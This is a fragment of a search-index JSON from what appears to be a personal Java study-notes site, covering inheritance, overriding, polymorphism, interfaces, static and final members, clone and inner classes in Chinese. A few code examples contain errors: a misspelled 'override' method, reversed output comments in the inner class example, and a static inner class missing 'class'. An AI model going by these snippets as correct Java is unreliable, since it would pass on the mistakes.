System.out.println(\"\u59d3\u540d\uff1a\"+stu.Name+\" \u5e74\u9f84\uff1a\"+stu.GetAge()+\" \u5206\u6570\uff1a\"+stu.score);  \n    }  \n}\n</code></pre> Info <p></p> <p>\u5728Idea\u4e2d\u53f3\u952e\u70b9\u51fb \u751f\u6210 -&gt; Getter\u548cSetter \u53ef\u4ee5\u4e00\u952e\u751f\u6210\u8f93\u5165\u8f93\u51fa\u7684\u5c01\u88c5</p>"},{"location":"Accumulation/JAVA/#_20","title":"\u7ee7\u627f","text":"<p>\u7236\u7c7b\u6709\u7684\uff0c\u6240\u6709\u5b50\u7c7b\u90fd\u5e94\u8be5\u6709</p> <p></p> <ul> <li>\u4f7f\u7528 extends \u5173\u952e\u8bcd\u7ee7\u627f\u7236\u7c7b</li> </ul> <pre><code>package ObjTest.Inheritance.Pet;  \n\npublic class Pet {  \n    private String Name;  \n    private int Age;  \n    private String Color;  \n\n    public String getName() {  \n        return Name;  \n    }  \n\n    public void setName(String name) {  \n        Name = name;  \n    }  \n\n    public int getAge() {  \n        return Age;  \n    }  \n\n    public void setAge(int age) {  \n        Age = age;  \n    }  \n\n    public String getColor() {  \n        return Color;  \n    }  \n\n    public void setColor(String color) {  \n        Color = color;  \n    }  \n\n    public void PrintInformation(){  \n        System.out.println(\"Name: \" + Name + \" Age: \" + Age + \" Color: \" + Color);  \n    }  \n}\n</code></pre> <pre><code>package ObjTest.Inheritance.Pet;  \n\npublic class Dog extends Pet{  \n    private String strain;  \n\n    public String getStrain() {  \n        return strain;  \n    }  \n\n    public void setStrain(String strain) {  \n        this.strain = strain;  \n    }  \n}\n</code></pre> <pre><code>package ObjTest.Inheritance.Pet;  \n\npublic class InheritTest {  \n    public static void main(String[] args) {  \n        Dog mydog = new Dog();  \n        mydog.setName(\"\u5929\u7fbd\u7f8e\u7fbd\");  \n        mydog.setAge(3);  \n        mydog.setColor(\"Purple\");  \n        mydog.setStrain(\"\u5b66\u59d0\");  \n\n        System.out.println(\"Name: \" + mydog.getName() + \" Age: \" + mydog.getAge() + \" Color: \" + mydog.getColor() + \" Strain: \" + mydog.getStrain());  \n        mydog.PrintInformation();  \n    }  \n}\n\n/* Output: \nName: \u5929\u7fbd\u7f8e\u7fbd Age: 3 Color: Purple Strain: \u5b66\u59d0\nName: \u5929\u7fbd\u7f8e\u7fbd Age: 3 Color: Purple\n*/\n</code></pre> <ul> <li>\u7ee7\u627f\u7684\u7279\u70b9<ul> <li>\u7ee7\u627f\u53ef\u4ee5\u4f20\u9012\uff0c\u53ef\u4ee5\u591a\u7ea7\u7ee7\u627f</li> <li>\u5355\u6839\u6027: \u4e00\u4e2a\u7c7b\u53ea\u80fd\u6709\u4e00\u4e2a\u76f4\u63a5\u7236\u7c7b\uff0c\u4f46\u662f\u53ef\u4ee5\u6709\u591a\u4e2a\u95f4\u63a5\u7236\u7c7b</li> <li>\u7236\u7c7b\u7684\u79c1\u6709\u5c5e\u6027\u53ef\u4ee5\u88ab\u7ee7\u627f\uff0c\u4f46\u662f\u4e0d\u80fd\u8bbf\u95ee</li> <li>\u5f53\u5b50\u7c7b\u548c\u7236\u7c7b\u6709\u540c\u540d\u5c5e\u6027\u7684\u65f6\u5019\u53ef\u4ee5\u52a0\u4e0a\u5173\u952e\u8bcd super \u533a\u5206\uff0c\u4e0d\u52a0super\u9ed8\u8ba4\u8bbf\u95ee\u5f53\u524d\u7c7b\u7684\u5c5e\u6027</li> </ul> </li> </ul>"},{"location":"Accumulation/JAVA/#override","title":"\u65b9\u6cd5\u91cd\u5199 Override","text":"<p>\u5f53\u7236\u7c7b\u63d0\u4f9b\u7684\u65b9\u6cd5\u65e0\u6cd5\u6ee1\u8db3\u5b50\u7c7b\u9700\u6c42\u65f6\uff0c\u53ef\u5728\u5b50\u7c7b\u4e2d\u5b9a\u4e49\u548c\u7236\u7c7b\u76f8\u540c\u7684\u65b9\u6cd5\u8fdb\u884c\u91cd\u5199</p> <pre><code>package ObjTest.Inheritance.Pet;  \n\npublic class Dog extends Pet{  \n    private String strain;  \n\n    public String getStrain() {  \n        return strain;  \n    }  \n\n    public void setStrain(String strain) {  \n        this.strain = strain;  \n    }  \n\n    public void PrintInfromation() {\n        super.PrintInformation();\n        System.out.println(\" strain: \"+strain);\n    }\n}\n</code></pre> <ul> <li>\u65b9\u6cd5\u91cd\u5199\u7684\u7279\u70b9:<ul> <li>\u8bbf\u95ee\u6743\u9650\u4e0d\u80fd\u53d8\u5c0f public &gt; protected &gt; default &gt; private</li> <li>\u8fd4\u56de\u503c\u7c7b\u578b\u8981\u548c\u7236\u7c7b\u4e00\u81f3\uff0c\u4e5f\u53ef\u4ee5\u662f\u7236\u7c7b\u8fd4\u56de\u7c7b\u578b\u7684\u5b50\u7c7b (\u5982\u7236\u7c7b\u4e2d\u8fd4\u56de\u7c7b\u578b\u5982\u679c\u4e3aPet\uff0c\u90a3\u4e48\u5b50\u7c7b\u91cd\u5199\u7684\u65b9\u6cd5\u53ef\u4ee5\u8fd4\u56deDog\u7c7b\u578b)</li> <li>\u65b9\u6cd5\u540d\u548c\u53c2\u6570\u5217\u8868\u8981\u4e00\u6837</li> </ul> </li> </ul>"},{"location":"Accumulation/JAVA/#_21","title":"\u7ee7\u627f\u4e0b\u7684\u6784\u9020\u6267\u884c","text":"<p>\u5728\u6267\u884c\u5b50\u7c7b\u7684\u6784\u9020\u7684\u65f6\u5019\uff0c\u4f1a\u9ed8\u8ba4\u8c03\u7528\u7236\u7c7b\u7684\u6784\u9020 <code>super()</code> </p> <pre><code>public class ConstructorTest {  \n    public static void main(String[] args) {  \n        C Test = new C();  \n    }  \n}  \n\nclass A {  \n    public A(){  \n        //super();\n        System.out.println(\"A\");  \n    }  \n}  \nclass B extends A {  \n    public B(){\n        //super();  \n        System.out.println(\"B\");  \n    }  \n}  \nclass C extends B {  \n    public C(){  \n        //super();\n        System.out.println(\"C\");  \n    }  \n}\n\n/* Output:\nA\nB\nC\n*/\n</code></pre> <p>\u4e5f\u53ef\u4ee5\u624b\u52a8\u8c03\u7528super\u6765\u8986\u76d6\u9ed8\u8ba4\u7684\u65e0\u53c2super</p> <pre><code>public class ConstructorTest {  \n    public static void main(String[] args) {  \n        C Test = new C(1,2,3);  \n        System.out.println(\"Construct is \"+Test.a+Test.b+Test.c);  \n    }  \n}  \n\nclass A {  \n    int a;  \n    public A(int a){  \n        this.a = a;  \n        System.out.println(\"A\");  \n    }  \n}  \nclass B extends A {  \n    int b;  \n    public B(int a , int b ){  \n        super(a);  \n        this.b = b;  \n        System.out.println(\"B\");  \n    }  \n}  \nclass C extends B {  \n    int c;  \n    public C(int a , int b , int c ){  \n        super(a,b);  \n        this.c = c;  \n        System.out.println(\"C\");  \n    }  \n}\n\n/*Output:\nA\nB\nC\nConstruct is 123\n*/\n</code></pre> <p>\u6700\u597d\u8fd8\u662f\u628a\u65e0\u53c2\u6784\u9020\u65b9\u6cd5\u8865\u4e0a\u54e6</p>"},{"location":"Accumulation/JAVA/#_22","title":"\u591a\u6001","text":"<p>\u7236\u7c7b\u5f15\u7528\u6307\u5411\u5b50\u7c7b\u5bf9\u8c61\uff0c\u4ece\u800c\u4ea7\u751f\u591a\u79cd\u5f62\u6001\uff0c\u5982 <code>Pet pet = new Dog();</code></p> <p>\u591a\u6001\u7684\u8868\u73b0\u5f62\u5f0f</p> <p>\u8c03\u7528\u7236\u7c7b\u7684\u65b9\u6cd5\uff0c\u6267\u884c\u5b50\u7c7b\u7684\u65b9\u6cd5</p> <pre><code>public class TestCast {  \n    public static void main(String[] args) {  \n        Pet pet = new Dog();  \n        pet.Name = \"\u5929\u7fbd\u7f8e\u7fbd\";  \n        pet.eat();  \n    }  \n}  \nclass Pet {  \n    String Name;  \n\n    public void eat(){  //\u7236\u7c7b\u4e00\u5b9a\u8981\u6709\u540c\u540d\u65b9\u6cd5\uff0c\u4e0d\u7136\u62a5\u9519\n        System.out.println(Name + \" is eating\");  \n    }  \n}  \nclass Dog extends Pet {  \n\n    public void eat() {  \n        System.out.println(Name + \" is eating me !\");  \n    }  \n}\n/* Output : \n\u5929\u7fbd\u7f8e\u7fbd is eating me !\n*/\n</code></pre> <ul> <li>\u5e94\u7528 \u5411\u4e0a\u8f6c\u578b</li> </ul> <pre><code>public class Test {\n    public static void main(String[] args) {\n        Master Me = new Master();\n        Me.feed(new dog());\n        Me.feed(new cat());\n    }\n}\n\nclass Master {\n    public void feed(Pet pet) {\n        pet.eat();\n    }\n}\n/*Output: \n\u72d7\u72d7\u5728\u5403\u9aa8\u5934\n\u732b\u732b\u5728\u5403\u9c7c\n*/\n</code></pre> <pre><code>public class Test {\n    public static void main(String[] args) {\n        Master Me = new Master();\n        Pet pet = Me.getPet(\"Dog\");\n        Me.feed(pet);\n    }\n}\n\nclass Master {\n    public void feed(Pet pet) {\n        pet.eat();\n    }\n    public Pet getPet(String type) {\n        if(type.equals(\"Dog\"))\n            return new Dog();\n        else\n            return new Cat();\n    }\n}\n\n/*\nOutput : \u72d7\u72d7\u5728\u5403\u9aa8\u5934\n*/\n</code></pre> <ul> <li>\u5411\u4e0b\u8f6c\u578b\uff0c\u5c06\u7236\u7c7b\u5f15\u7528\u7684\u771f\u5b9e\u5b50\u7c7b\u5bf9\u8c61\u5f3a\u884c\u8f6c\u4e3a\u5b50\u7c7b\u672c\u8eab\u7c7b\u578b\uff0c\u624d\u80fd\u8c03\u7528\u5b50\u7c7b\u7684\u65b9\u6cd5</li> </ul> <pre><code>public class Test {\n    public static void main(String[] args) {\n        Master Me = new Master();\n        Me.Play(new Dog());\n    }\n}\n\nclass Master {\n    public void Play(Pet pet) {\n        if(pet instanceof Dog){\n            Dog dog = (Dog)pet;\n            dog.CatchDisk();//\u72d7\u72ec\u6709\u7684\u65b9\u6cd5\uff0c\u5176\u5b83Pet\u5b50\u7c7b\u6ca1\u6709\n        }else{\n            Cat cat = (Cat)pet;\n            cat.AimaoTV();\n        }\n    }\n}\n</code></pre> <p>instanceof : \u7c7b\u578b\u5224\u65ad\u8bed\u53e5</p>"},{"location":"Accumulation/JAVA/#_23","title":"\u62bd\u8c61\u7c7b","text":"<ul> <li>\u7528\u5173\u952e\u8bcd abstract \u4fee\u9970\u7c7b\uff0c\u6b64\u7c7b\u4e0d\u80fdnew\u5bf9\u8c61\u3002\u62bd\u8c61\u7c7b\u610f\u4e3a\u4e0d\u591f\u5b8c\u6574\u7684\u7c7b\uff0c\u65e0\u6cd5\u72ec\u7acb\u5b58\u5728\u3002</li> <li>\u540c\u7406\uff0c\u88ababstract\u4fee\u9970\u7684\u65b9\u6cd5\u79f0\u4e3a\u62bd\u8c61\u65b9\u6cd5\uff0c \u53ea\u6709\u65b9\u6cd5\u58f0\u660e\uff0c\u6ca1\u6709\u65b9\u6cd5\u5b9e\u73b0({}\u5185\u7684\u90e8\u5206) \uff0c\u5fc5\u987b\u5305\u542b\u5728\u62bd\u8c61\u7c7b\u91cc\u9762</li> </ul> <p>Warning</p> <p>\u62bd\u8c61\u65b9\u6cd5\u5fc5\u987b\u5728\u62bd\u8c61\u7c7b\u4e2d\u3002 \u8fd9\u53e5\u8bba\u65ad\u662f\u9519\u8bef\u7684\uff0c\u56e0\u4e3a\u62bd\u8c61\u65b9\u6cd5\u53ef\u4ee5\u653e\u5728\u62bd\u8c61\u7c7b\u548c\u63a5\u53e3\u4e2d\u3002</p> <p>\u6b63\u786e\u7684\u8868\u8ff0\u662f\u62bd\u8c61\u65b9\u6cd5\u6240\u5728\u7684\u7c7b\u4e00\u5b9a\u662f\u62bd\u8c61\u7c7b</p> <p>\u62bd\u8c61\u7c7b\u548c\u62bd\u8c61\u65b9\u6cd5\u80fd\u5e2e\u52a9\u6211\u4eec\u66f4\u89c4\u8303\u7684\u4f7f\u7528\u591a\u6001</p> <pre><code>abstract class Pet {  \n    String Name;  \n\n    public abstract void eat();  \n    //\u7236\u7c7b\u62bd\u8c61\u65b9\u6cd5\u5b50\u7c7b\u5fc5\u987b\u5b9e\u73b0\n\n}  \nclass Dog extends Pet {  \n\n    public void eat() {  \n        System.out.println(Name + \" is eating\");  \n    }  \n\n}\n</code></pre>"},{"location":"Accumulation/JAVA/#_24","title":"\u9759\u6001\u6210\u5458\u548c\u9759\u6001\u65b9\u6cd5","text":"<p>\u9759\u6001\u5173\u952e\u8bcd static</p> <pre><code>public class Test {\n    public static void main(String[] args){\n        MyClass mc1 = new MyClass();\n        mc1.a = 10;\n        MyClass mc2 = new MyClass();\n        mc2.a = 20;\n\n        System.out.println(mc1.a+\"-\"+mc2.a);\n    //Output: 20-20\n    }\n}\n\nclass MyClass {\n    static int a;\n}\n</code></pre> <ul> <li>\u9759\u6001\u5c5e\u6027\u662f\u7c7b\u7684\u6240\u6709\u5bf9\u8c61\u90fd\u5171\u4eab\u4e00\u4efd\u7a7a\u95f4\uff0c\u4efb\u4f55\u5bf9\u8c61\u4fee\u6539\uff0c\u90fd\u4f1a\u5f71\u54cd\u5176\u5b83\u5bf9\u8c61\u3002</li> <li>\u56e0\u6b64\u6211\u4eec\u6b63\u786e\u8c03\u7528\u9759\u6001\u5c5e\u6027\u5176\u5b9e\u4f7f\u7528\u7c7b\u540d\u53bb\u8c03\u7528\uff0c\u5982 <code>MyClass.a = 10;</code> </li> </ul> <p>\u5982\uff0c\u6211\u4eec\u53ef\u4ee5\u5229\u7528\u9759\u6001\u53d8\u91cf\u7684\u7279\u6027Count\u7a0b\u5e8f\u4e2d\u5171\u5b9e\u4f8b\u5316\u591a\u5c11\u6b21\u8fd9\u4e2a\u7c7b:</p> <pre><code>class MyClass {\n    static int a;\n\n    public MyClass() {\n        a++;\n    }\n}\n</code></pre> <p>\u540c\u7406\uff0c\u9759\u6001\u65b9\u6cd5\u4e5f\u662f\u7ecf\u7531\u7c7b\u540d\u76f4\u63a5\u8c03\u7528\uff0c\u533a\u522b\u5728\u4e8e\u9759\u6001\u65b9\u6cd5\u76f4\u63a5\u53ef\u4ee5\u4e92\u76f8\u8c03\u7528\uff0c\u5982\uff1a</p> <pre><code>class MyClass {\n    static int a;\n\n    public static void m1() {\n        System.out.println(\"m1\");\n        m2();\n    //\u8fd9\u91cc\u5c31\u4e0d\u80fd\u52a0 m3();\n    }\n    public static void m2() {\n        System.out.println(\"m2\");\n    }\n    public void m3() {\n        System.out.println(\"m3\");\n    }\n}\n</code></pre> <p>Danger</p> <p>\u9759\u6001\u65b9\u6cd5\u4e2d\u4e0d\u80fd\u8c03\u7528 this,super \u5173\u952e\u8bcd</p> <ul> <li>\u9759\u6001\u65b9\u6cd5\u7279\u70b9\u603b\u7ed3<ul> <li>\u9759\u6001\u65b9\u6cd5\u5141\u8bb8\u76f4\u63a5\u8bbf\u95ee\u9759\u6001\u6210\u5458</li> <li>\u9759\u6001\u65b9\u6cd5\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee\u975e\u9759\u6001\u6210\u5458</li> <li>\u9759\u6001\u65b9\u6cd5\u4e0d\u5141\u8bb8\u4f7f\u7528this\u6216super\u5173\u952e\u5b57</li> <li>\u9759\u6001\u65b9\u6cd5\u53ef\u4ee5\u88ab\u7ee7\u627f\uff0c\u4f46\u4e0d\u80fd\u88ab\u91cd\u5199\u3001\u591a\u6001</li> </ul> </li> </ul>"},{"location":"Accumulation/JAVA/#final","title":"Final \u6700\u7ec8","text":"<ul> <li>final \u6700\u540e\u7684,\u4e0d\u53ef\u66f4\u6539\u7684</li> <li>\u53ef\u4fee\u9970\u7684\u5185\u5bb9<ul> <li>\u7c7b (\u6700\u7ec8\u7c7b)<ul> <li>\u4e0d\u53ef\u88ab\u7ee7\u627f</li> <li>String,Math,System\u5747\u4e3afinal\u4fee\u9970\u7684\u7c7b</li> </ul> </li> <li>\u65b9\u6cd5 (\u6700\u7ec8\u65b9\u6cd5)<ul> <li>\u4e0d\u80fd\u88ab\u8986\u76d6</li> </ul> </li> <li>\u53d8\u91cf (\u6700\u7ec8\u53d8\u91cf)<ul> <li>\u503c\u4e0d\u80fd\u88ab\u6539\u53d8</li> <li>\u53ea\u80fd\u5728\u5b9a\u4e49\u7684\u65f6\u5019\u8d4b\u503c\u6216\u5728\u6784\u9020\u65b9\u6cd5\u4e2d\u8d4b\u503c</li> </ul> </li> </ul> </li> </ul> <pre><code>class sub {\n    final int a = 10;\n}\n</code></pre> <pre><code>class sub {\n    final int a;\n\n    public sub() {\n        a = 10;\n    }\n\n    public sub(int a){\n        this.a = a;\n    }\n}\n</code></pre> <p>\u9759\u6001\u5e38\u91cf\u53ea\u80fd\u5b9a\u4e49\u7684\u65f6\u5019\u8d4b\u503c\u6216\u5728\u9759\u6001\u4ee3\u7801\u5757\u4e2d\u8d4b\u503c</p> <pre><code>final static int NUM;\nstatic {\n    NUM = 10;\n}\n</code></pre>"},{"location":"Accumulation/JAVA/#_25","title":"\u63a5\u53e3","text":"<p>\u63a5\u53e3\u76f8\u5f53\u4e8e\u7279\u6b8a\u7684\u62bd\u8c61\u7c7b\uff0c\u5b9a\u4e49\u65b9\u5f0f\u3001\u7ec4\u6210\u90e8\u5206\u4e0e\u62bd\u8c61\u7c7b\u7c7b\u4f3c</p> <p>\u63a5\u53e3\u547d\u540d\u89c4\u8303: \u4ee5\u5927\u5199I\u5f00\u5934\uff0ca,b,l,e\u7ed3\u5c3e</p> <p></p> <p>\u963f\u91cc\u89c4\u8303\u4e2d\u8981\u6c42\u7701\u7565\u5199</p> <pre><code>package ObjTest.Interfaces;  \n\npublic interface ITest {  \n    public static final double VERSION = 1.0;  \n    int HISTORY = 3; //\u4e00\u822c\u8fd9\u6837\u5199\uff0c\u56e0\u4e3a\u5728\u63a5\u53e3\u4e2d\u4f1a\u9ed8\u8ba4\u52a0\u4e0a public static final  \n    public abstract void method1();  \n    void method2(); //\u540c\u7406\uff0c\u9ed8\u8ba4\u52a0\u4e0a public abstract}\n}\n</code></pre> <pre><code>package ObjTest.Interfaces;  \n\npublic class SubTest implements ITest{  \n    public void method1(){  \n        System.out.println(\"method1\");  \n    }  \n    public void method2(){  \n        System.out.println(\"method2\");  \n    }  \n}\n</code></pre> <pre><code>package ObjTest.Interfaces;  \n\npublic class Test {  \n    public static void main(String[] args) {  \n        SubTest test = new SubTest(); //or ITest test = new SubTest(); \u540c\u591a\u6001  \n        test.method1();  \n        System.out.println(\"VERSION is \"+ITest.VERSION);  \n        System.out.println(\"HISTORY is \"+ITest.HISTORY);  \n    }  \n}\n/*Output:\nmethod1\nVERSION is 1.0\nHISTORY is 3\n*/\n</code></pre> <p>\u5f53\u5355\u7ee7\u627f\u65e0\u6cd5\u6ee1\u8db3\u5b50\u7c7b\u9700\u6c42\u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u7528\u63a5\u53e3\u4e3a\u7c7b\u62d3\u5c55\u591a\u79cd\u80fd\u529b\uff0c\u5b9e\u73b0\u591a\u7ee7\u627f</p> <pre><code>package ObjTest.Interfaces.Able;  \n\npublic interface ICode {  \n    void code();  \n}\n</code></pre> <pre><code>package ObjTest.Interfaces.Able;  \n\npublic interface IDraw {  \n    void draw();  \n}\n</code></pre> <pre><code>package ObjTest.Interfaces.Able;  \n\npublic class Student implements ICode, IDraw{  \n    private String name;  \n\n    @Override  \n    public void code() {  \n        System.out.println(name+\" is coding\");  \n    }  \n\n    @Override  \n    public void draw() {  \n        System.out.println(name+\" is drawing\");  \n    }  \n\n    public void setName(String name){  \n        this.name = name;  \n    }  \n}\n</code></pre> <pre><code>package ObjTest.Interfaces.Able;  \n\npublic class Test {  \n    public static void main(String[] args) {  \n        Student s1 = new Student();  \n        s1.setName(\"Inuisana\");  \n        s1.code();  \n        s1.draw();  \n    }  \n}\n/*Output:\nInuisana is coding\nInuisana is drawing\n*/\n</code></pre> <p>\u63a5\u53e3\u6709\u65f6\u5019\u8fd8\u80fd\u8868\u793a\u4e00\u79cd\u6807\u8bb0\uff0c\u5982\uff1a\u6ca1\u6709Serializable\u5c31\u4e0d\u80fd\u5e8f\u5217\u5316\uff0c\u6ca1\u6709Cloneable\u5c31\u4e0d\u80fd\u590d\u5236</p>"},{"location":"Accumulation/JAVA/#_26","title":"\u63a5\u53e3\u56de\u8c03","text":"<p>\u6ca1\u542c\u61c2\u55b5...</p> <p>\u4e3a\u4ec0\u4e48\u4f1a\u6709\u63a5\u53e3\u56de\u8c03\uff1f\u4ec0\u4e48\u662f\u63a5\u53e3\u56de\u8c03\uff1f</p> <p>\u5176\u5b9e\u8fd9\u4e24\u4e2a\u95ee\u9898\u662f\u4e00\u4e2a\u95ee\u9898\uff0c\u77e5\u9053\u4e86\u63a5\u53e3\u56de\u8c03\u7684\u539f\u7406\u81ea\u7136\u5c31\u77e5\u9053\u4e86\u4e3a\u4ec0\u4e48\u4f1a\u6709\u8fd9\u4e48\u4e2a\u4e1c\u897f\u3002\u6211\u4eec\u77e5\u9053java\u4e2d\u63a5\u53e3\u662f\u4e0d\u53ef\u4ee5\u76f4\u63a5\u521b\u5efa\u5b9e\u4f8b\u7684\uff0c\u90a3\u4e48\u95ee\u9898\u6765\u4e86\uff0c\u5047\u5982\u6211\u628a\u4e00\u4e2a\u63a5\u53e3\u58f0\u660e\u4e3a\u4e00\u4e2a\u53d8\u91cf\uff0c\u90a3\u4e48\u6211\u6267\u884c\u8fd9\u4e2a\u63a5\u53e3\u4e2d\u7684\u65b9\u6cd5\uff0c\u63a5\u53e3\u6ca1\u6709\u5b9e\u4f8b\u5b83\u8be5\u600e\u4e48\u529e\u5462\uff1f\u554a\u54c8\uff0c\u8fd9\u91cc\u81ea\u7136\u53c8\u6539\u51fa\u73b0java\u4e2d\u7684\u53e6\u4e00\u4e2a\u7279\u6027\u2014\u201c\u591a\u6001\u201d\uff0c\u8fd9\u65f6java\u865a\u62df\u673a\u81ea\u7136\u4f1a\u53bb\u627e\u5176\u5b50\u7c7b\uff0c\u8c03\u7528\u5176\u5b50\u7c7b\u4e2d\u5df2\u7ecf\u91cd\u8f7d\u7684\u8be5\u65b9\u6cd5\uff0c\u8fd9\u91cc\u5c31\u662f\u63a5\u53e3\u56de\u8c03\u7684\u672c\u8d28\uff01\uff01\u6211\u4eec\u53ea\u9700\u8981\u7ed9\u8be5\u53d8\u91cf\u6307\u5411\u5176\u5b50\u7c7b\u7684\u5730\u5740\u5c31\u53ef\u4ee5\u5728\u8c03\u7528\u7684\u65f6\u5019\u77e5\u9053\u8c03\u7528\u5b50\u7c7b\u7684\u65b9\u6cd5\u3002\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u5728A\u7c7b\u4e2d\u521b\u5efa\u63a5\u53e3\u7684\u5b50\u7c7b\u5b9e\u4f8b\uff0c\u5728B\u7c7b\u4e2d\u521b\u5efa\u4e00\u4e2a\u63a5\u53e3\u7684\u53d8\u91cf\uff0c\u628aA\u7c7b\u7684\u5730\u5740\u4f20\u7ed9B\u7c7b\u7684\u53d8\u91cf\uff0c\u5728\u53d8\u91cf\u6267\u884c\u63a5\u53e3\u4e2d\u7684\u65b9\u6cd5\u7684\u65f6\u5019\u5c31\u4f1a\u8c03\u7528A\u7c7b\u4e2d\u91cd\u5199\u7684\u65b9\u6cd5\uff0c\u8fd9\u5c31\u662f\u63a5\u53e3\u56de\u8c03\u7684\u6267\u884c\u6b65\u9aa4\u3002\u6211\u4eec\u5728\u7f51\u7edc\u8bf7\u6c42\u7b49\u8017\u65f6\u7684\u64cd\u4f5c\u7684\u65f6\u5019\u4f1a\u4f7f\u7528\u5230\u8be5\u673a\u5236\uff0c\u7528\u6765\u628a\u5f97\u5230\u7684\u6570\u636e\u4f20\u56de\u4e3b\u7ebf\u7a0b\u4e2d\u3002</p>"},{"location":"Accumulation/JAVA/#object","title":"Object \u7c7b\u7684\u65b9\u6cd5","text":"<p>\u4e07\u7269\u7686\u5bf9\u8c61\uff0c\u4efb\u4f55\u7c7b\u548c\u63a5\u53e3\u90fd\u76f4\u63a5\u6216\u95f4\u63a5\u7ee7\u627f\u4e86Object\u7c7b</p> <pre><code>Object S1 = new Student(); \nSystem.out.println(S1.getClass().getSimpleName());\n//Output: Student \u83b7\u53d6\u771f\u5b9e\u7c7b\u540d\uff0c\u662f\u53cd\u5c04\u7684\u57fa\u7840\n\nSystem.out.println(S1.hashcode());\n//\u8f93\u51faS1\u7269\u7406\u5730\u5740\u7684Hash\u503c(java\u4e2d\u5730\u5740\u88ab\u5c01\u88c5\u4e86\u65e0\u6cd5\u76f4\u63a5\u64cd\u4f5c)\n\nSystem.out.println(\"aa\".equals(\"aa\"));\n//Output: True  equals\u53ef\u4ee5\u7528\u5728\u6bd4\u8f83\u4efb\u610f\u7c7b\n\nSystem.out.println(S1.toString());\n//Output: ObjTest.Interfaces.Able.Student@723279cf\n//\u524d\u534a\u90e8\u5206\u662fS1\u7684\u7c7b\uff0c\u540e\u534a\u662f\u7269\u7406\u5730\u5740\u7684hash\u503c\n//\u8981\u8fbe\u5230\u9884\u671f\u6548\u679c\uff0c\u53ef\u4ee5\u5728Student\u7c7b\u4e2d\u91cd\u5199toString\u65b9\u6cd5\n//System.out.println(S1); \u540c\u6837\u6548\u679c\uff0c\u9ed8\u8ba4\u4f1a\u8c03\u7528toString()\n</code></pre>"},{"location":"Accumulation/JAVA/#clone","title":"clone","text":"<pre><code>public class Student implements ICode, Cloneable{  \n    private String name;  \n\n    @Override  \n    public void code() {  \n        System.out.println(name+\" is coding\");  \n    }  \n\n    public void setName(String name){  \n        this.name = name;  \n    }  \n    public Student clone() throws CloneNotSupportedException {  \n        return (Student) super.clone();  \n    }  \n}\n</code></pre> <pre><code>public class Test {  \n    public static void main(String[] args) throws CloneNotSupportedException {  \n        Student s1 = new Student();  \n        s1.setName(\"Inuisana\");  \n        s1.code();  \n        Student S2 = s1.clone();  \n        S2.setName(\"Nimisora\");  \n        s1.code();  \n    }  \n}\n/*Output:\nInuisana is coding\nInuisana is coding\n*/\n</code></pre> <p>\u8981\u5728\u7c7b\u4e2d\u91cd\u5199clone\uff0c\u5e76\u7528Cloneable\u6807\u8bb0</p>"},{"location":"Accumulation/JAVA/#_27","title":"\u5185\u90e8\u7c7b","text":"<p>\u5728\u4e00\u4e2a\u7c7b\u7684\u5185\u90e8\u518d\u5b9a\u4e49\u4e00\u4e2a\u5b8c\u6574\u7684\u7c7b</p> <ul> <li>\u7279\u70b9<ul> <li>\u7f16\u8bd1\u4e4b\u540e\u53ef\u751f\u6210\u72ec\u7acb\u7684\u5b57\u8282\u7801\u6587\u4ef6</li> <li>\u5185\u90e8\u7c7b\u53ef\u76f4\u63a5\u8bbf\u95ee\u5916\u90e8\u7c7b\u7684\u79c1\u6709\u6210\u5458\uff0c\u800c\u4e0d\u7834\u574f\u5c01\u88c5</li> <li>\u53ef\u4e3a\u5916\u90e8\u7c7b\u63d0\u4f9b\u5fc5\u8981\u7684\u5185\u90e8\u529f\u80fd\u7ec4\u4ef6</li> </ul> </li> <li>\u5206\u7c7b<ul> <li>\u6210\u5458\u5185\u90e8\u7c7b</li> <li>\u9759\u6001\u5185\u90e8\u7c7b</li> <li>\u5c40\u90e8\u5185\u90e8\u7c7b</li> <li>\u533f\u540d\u5185\u90e8\u7c7b</li> </ul> </li> </ul>"},{"location":"Accumulation/JAVA/#_28","title":"\u6210\u5458\u5185\u90e8\u7c7b","text":"<p>\u5728\u6210\u5458\u53d8\u91cf\u4f4d\u7f6e\u5b9a\u4e49\u5185\u90e8\u7c7b\u5219\u53eb\u6210\u5458\u5185\u90e8\u7c7b</p> <pre><code>public class Outer {\n    int num = 3;\n    public class In {\n        int num = 2;\n        public void inMethod() {\n            int num = 1;\n            System.out.println(\"\u6267\u884c\u5185\u90e8\u7c7b\u7684\u65b9\u6cd5\");\n            System.out.println(num);//3\n            System.out.println(this.num);//2\n            System.out.println(Outer.this.num);//1\n        }\n    }\n}\n</code></pre> <pre><code>Outer out = new Outer();\nIn in = out.new In();//\u5185\u90e8\u7c7b\u5bf9\u8c61\u5b9e\u4f8b\u5316\u683c\u5f0f\nin.inMethod();\n\nIn in = new Outer().new In();//\u4e0d\u5728\u610f\u5916\u90e8\u7c7b\u7684\u8bdd\u53ef\u4ee5\u76f4\u63a5\u8fd9\u6837\u5199\nin.inMethod();\n</code></pre> <p>\u4f7f\u7528\u5185\u90e8\u7c7b\u5bf9\u529f\u80fd\u5b9e\u73b0\u66f4\u5f3a\u7684\u5c01\u88c5</p> <pre><code>public class Outer {\n    private class In {\n        public int inMethod (int a ,int b) {\n            return a+b;\n        }\n    }\n    public int add(int a ,int b) {\n        return new In().inMethod(a,b);\n    }\n}\n</code></pre>"},{"location":"Accumulation/JAVA/#_29","title":"\u9759\u6001\u5185\u90e8\u7c7b","text":"<pre><code>public class Outer {\n    public static In {\n        public void show() {\n            System.out.println(\"\u9759\u6001\u5185\u90e8\u7c7b\u65b9\u6cd5\");\n        }\n    }\n}\n\n---\n//\u6d4b\u8bd5\u7c7b\nOuter.In in = new Outer.In();\nin.show();\n</code></pre> <p>\u9759\u6001\u5185\u90e8\u7c7b\u53ea\u80fd\u8bbf\u95ee\u5230\u5916\u90e8\u7c7b\u7684\u9759\u6001\u53d8\u91cf</p>"},{"location":"Accumulation/JAVA/#_30","title":"\u5c40\u90e8\u5185\u90e8\u7c7b","text":"<p>\u5728\u5c40\u90e8\u53d8\u91cf\u4f4d\u7f6e\u5b9a\u4e49\u5185\u90e8\u7c7b\u5219\u53eb\u5c40\u90e8\u5185\u90e8\u7c7b</p> <pre><code>public class Outer {\n\n    public void method() {\n        int num = 8;\n        class In {\n            public void inMethod() {\n                System.out.println(\"\u5c40\u90e8\u5185\u90e8\u7c7b\");\n                